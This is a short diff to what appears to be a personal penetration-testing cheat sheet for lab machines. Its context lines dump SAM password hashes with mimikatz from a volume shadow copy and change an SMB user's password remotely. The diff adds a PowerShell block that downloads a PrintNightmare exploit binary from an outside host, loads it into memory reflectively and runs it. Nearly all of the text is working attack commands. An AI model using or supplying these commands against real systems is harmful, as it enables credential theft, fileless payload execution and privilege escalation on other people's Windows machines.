@@ -1013,6 +1013,12 @@ vssadmin list shadows
 >> use mimikatz or secretsdump
 mimikatz# lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
 
-[smb change password]
+[change smb password]
 smbpasswd -U bhult -r 10.10.10.193
 
+[reflective load assembly]
+```
+$raw = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.10/SharpPrintNightMare.exe')
+$assem = [System.Reflection.Assembly]::Load($raw)
+[SharpPrintNightmare.Program]::Main("C:\Windows\Tasks\NotMal.dll".Split())
+```
